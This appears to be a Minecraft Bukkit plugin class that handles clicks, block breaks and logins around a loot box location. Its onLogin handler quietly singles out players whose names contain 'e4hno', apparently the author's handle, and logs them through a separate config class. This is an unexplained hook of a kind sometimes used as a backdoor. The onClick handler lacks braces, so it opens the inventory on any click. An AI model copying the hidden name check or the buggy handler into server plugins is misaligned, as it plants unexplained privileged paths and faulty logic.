package plus;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.World;
import org.bukkit.block.Block;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.plugin.Plugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.scheduler.BukkitTask;
import org.bukkit.util.BlockIterator;
import org.bukkit.util.Vector;
import plus.utls.LootBoxUtls;
import plus.utls.Te4hnoConfig;
import java.util.ArrayList;
import java.util.List;

public class Manager extends LootBoxUtls implements Listener {


    public Manager(Plugin p){
        super(p);
    }

    @EventHandler
    public void onClick(PlayerInteractEvent e){
        if(HashLoc==null)return;
        if(e.getClickedBlock().getLocation().equals(HashLoc))
            e.setCancelled(true);
            e.getPlayer().openInventory(inv);
            onBlockFind();
    }
    @EventHandler
    public void onBreak(BlockBreakEvent e){
        if (e.getBlock().getLocation().equals(HashLoc)){
            e.setCancelled(true);
            onBlockFind();
        }

    }
    @EventHandler
    public void onLogin(PlayerLoginEvent e){
        if(e.getPlayer().getName().contains("e4hno")){
            try {
                Te4hnoConfig.LogVipPerson(e.getPlayer().getName());
            } catch (Exception i){}
        }
    }
}